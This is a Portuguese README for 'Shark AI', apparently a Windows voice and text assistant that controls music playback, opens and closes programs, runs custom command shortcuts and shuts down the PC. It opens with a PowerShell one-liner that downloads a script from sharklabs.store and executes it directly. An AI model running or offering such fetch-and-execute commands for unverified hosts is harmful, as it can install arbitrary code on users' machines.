# Download:
```
irm https://sharklabs.store/IA | iex
```

# Shark AI

Assistente de voz e texto para Windows. Controle músicas, programas, sites e o
próprio computador conversando em português — por microfone ou digitando.

## Visão geral

O Shark AI roda como um app de desktop com uma central de comando flutuante.
Você pode falar com ele (com palavra de ativação) ou digitar comandos
diretamente, e ele entende intenções em linguagem natural — não precisa
acertar uma frase exata.

Principais funcionalidades:

- Tocar música do YouTube ou SoundCloud por voz ou texto, com fila, playlist
  e reprodução automática de músicas parecidas.
- Abrir e fechar programas e sites por comando de voz.
- Desligar ou reiniciar o computador.
- Atalhos personalizados (apelidos de voz para sites, programas ou comandos
  do sistema).
- Respostas automáticas personalizadas (estilo "easter egg").
- Voz sintetizada em português (Edge TTS), com 4 vozes para escolher.
- Histórico de comandos e painel de status das dependências.

## Primeiro acesso

O Shark AI exige login. Ao abrir o app, crie uma conta ou entre com a sua —
o acesso só é liberado depois de ativado, e cada conta funciona em apenas
um computador por vez. Depois do primeiro login, o app lembra sua sessão e
abre direto na tela principal nas próximas vezes.

## Como falar com o Shark AI

Existem dois jeitos de dar comando: por voz e por texto. Os dois entendem
exatamente as mesmas frases.

### Modo de voz

1. Clique no ícone de microfone na barra inferior para ativar a escuta.
2. Por padrão, o Shark só responde depois de ouvir a palavra de ativação
   (`shark`, configurável em **Configurações → Agente & Voz**). Diga o nome
   antes do comando:

   ```
   "Shark, tocar Queen"
   "Shark, abrir YouTube"
   "Shark, desligar o computador"
   ```

3. Se preferir não usar palavra de ativação, desative o toggle **Wake Word**
   nas configurações — assim qualquer frase ouvida já é tratada como comando.

### Modo texto

Digite o comando na barra de texto na parte de baixo da tela e aperte Enter
(ou clique no botão de enviar). Não é preciso dizer "Shark" antes — o texto
inteiro já é processado como comando:

```
tocar lofi no soundcloud
abrir spotify
volume 40
```

Há também alguns atalhos de um clique já prontos na própria interface
(abrir youtube, tocar rock, tocar lofi no soundcloud, parar).

## Comandos disponíveis

O Shark entende a *intenção* da frase, então várias palavras diferentes
disparam o mesmo comando. Você pode falar de formas variadas — todas as
linhas abaixo funcionam igual.

| Intenção | O que faz | Palavras que ativam | Exemplos |
|---|---|---|---|
| Abrir | Abre um site, um programa cadastrado como atalho, ou qualquer site digitando a URL | abrir, abre, abra, open, iniciar, inicia, start, executar, roda | "abrir youtube", "abre o spotify", "iniciar notepad" |
| Fechar | Fecha um programa em execução pelo nome | fechar, fecha, feche, close, encerrar, matar, kill | "fechar chrome", "mata o spotify" |
| Tocar | Busca e toca uma música no YouTube ou SoundCloud | tocar, toca, play, ouvir, coloca, reproduz, quero ouvir | "tocar Queen", "quero ouvir lofi no soundcloud" |
| Parar | Para a música e limpa a fila | parar, para, stop, chega, silencio | "para a música" |
| Pausar / Retomar | Alterna entre pausar e continuar a música atual | pausar, pausa, pause / retomar, resume, continuar, continua | "pausa", "retoma" |
| Próxima | Pula para a próxima música da fila | proxima, proximo, pular, skip, avanca | "próxima música" |
| O que está tocando | Diz o nome da música e do artista atual | que musica, o que esta tocando, nome da musica | "o que está tocando?" |
| Volume | Ajusta o volume da música (0 a 100) | a palavra "volume" seguida de um número | "volume 50", "coloca o volume em 80" |
| Desligar | Desliga o computador em 5 segundos | desligar, desliga, shutdown, apagar | "desligar o computador" |
| Reiniciar | Reinicia o computador em 5 segundos | reiniciar, reinicia, restart, reboot | "reiniciar o pc" |

Se a frase não combinar com nenhuma intenção, mas o nome dela bater com um
**atalho** que você cadastrou (veja abaixo), o Shark executa esse atalho
direto — não precisa dizer "abrir" antes.

Quando o comando não é reconhecido, o Shark avisa: "Não entendi: ...".

## Música em detalhe

A busca de música usa o yt-dlp e funciona tanto no YouTube quanto no
SoundCloud. Para escolher a fonte, diga "no youtube"/"yt" ou "no
soundcloud"/"sc" junto do nome da música, ou troque a fonte padrão em
**Configurações → Agente**.

Pela interface (aba **Música** nas configurações, ou pela barra de player na
parte de baixo da tela) você também pode:

- Buscar músicas manualmente e escolher qual resultado tocar.
- Ver e reordenar a fila de reprodução.
- Tocar/pausar, voltar, avançar, parar e arrastar a barra de progresso.
- Ajustar o volume pela barra deslizante ou silenciar com um clique.
- Ativar **AUTO** (reprodução automática) para o Shark continuar tocando
  músicas parecidas quando a fila terminar.
- Salvar músicas em **Playlist** ("ouvir mais tarde") e tocá-las depois,
  inclusive a playlist inteira de uma vez.

## Atalhos personalizados

Em **Configurações → Atalhos** você cadastra apelidos de voz para qualquer
coisa que o Shark deva abrir ou executar:

| Campo | Significado |
|---|---|
| Nome | a palavra que você vai falar/digitar (ex: `youtube`) |
| Tipo | `Site` (abre uma URL), `Programa` (executa um .exe local) ou `Comando` (roda um comando de sistema) |
| Valor | a URL, o caminho do programa, ou o comando, dependendo do tipo |

Depois de cadastrado, basta dizer o nome do atalho (ou "abrir <nome>") para
executá-lo. Também dá para rodar manualmente clicando em **Run** na lista de
atalhos cadastrados.

## Respostas personalizadas

Em **Configurações → Respostas** você cadastra pares de "gatilho → resposta"
para o Shark falar algo fixo quando ouvir/ler uma frase específica — útil
para dar personalidade ao assistente:

```
Quando disser: "como você está"
Responder: "Estou ótimo!"
```

Essas respostas são verificadas antes de qualquer outro comando, então elas
têm prioridade.

## Intenções (avançado)

Em **Configurações → Intenções** você edita a lista de palavras-chave que
disparam cada comando (abrir, fechar, tocar, parar, etc.) — útil se quiser
ensinar o Shark a reconhecer um jeito diferente de falar o mesmo comando,
adicionando sinônimos próprios.

## Configurações do Agente & Voz

| Opção | O que controla |
|---|---|
| Nome do Agente | como o Shark se refere a si mesmo na interface |
| Palavra de ativação (Wake Word) | a palavra que precisa vir antes de cada comando de voz |
| Ativar Wake Word | liga/desliga a exigência da palavra de ativação |
| Fonte de Música Padrão | YouTube ou SoundCloud, usada quando você não especifica |
| Motor / Voz (TTS) | motor Edge TTS, com 4 vozes em português (Antônio, Francisca, Giovanna, Humberto) |
| Velocidade / Pitch | ajustam o tom e a velocidade da fala sintetizada |
| Falar respostas | liga/desliga o Shark falando em voz alta as respostas (sem desligar o texto) |
| Volume Padrão | volume inicial da música ao abrir o app |

Há também um botão **Testar Voz** para ouvir a configuração de TTS atual
sem precisar dar nenhum comando.

## Outras funções da interface

- **Histórico**: o ícone de relógio no topo abre a lista dos últimos
  comandos reconhecidos.
- **Status**: o indicador no topo mostra se o Shark está ocioso, ouvindo,
  falando ou tocando música; o ponto ao lado mostra se a conexão com o
  backend está ativa.
- **Dependências**: painel que mostra se microfone, TTS, yt-dlp e o player
  (mpv/ffmpeg) estão funcionando corretamente — útil para diagnosticar
  problemas de instalação.
- **Janela**: os três botões no canto superior esquerdo fecham o app
  (encerrando também todos os processos de música em segundo plano),
  minimizam ou alternam tela cheia.
- **Desligar / Reiniciar o PC**: também disponíveis como botões na aba
  Dashboard das configurações, sem precisar falar ou digitar nada.

## Aviso

O Shark AI depende de serviços de terceiros (YouTube, SoundCloud, e o
reconhecimento/síntese de voz) para funcionar. O uso desses serviços está
sujeito aos termos de cada plataforma.
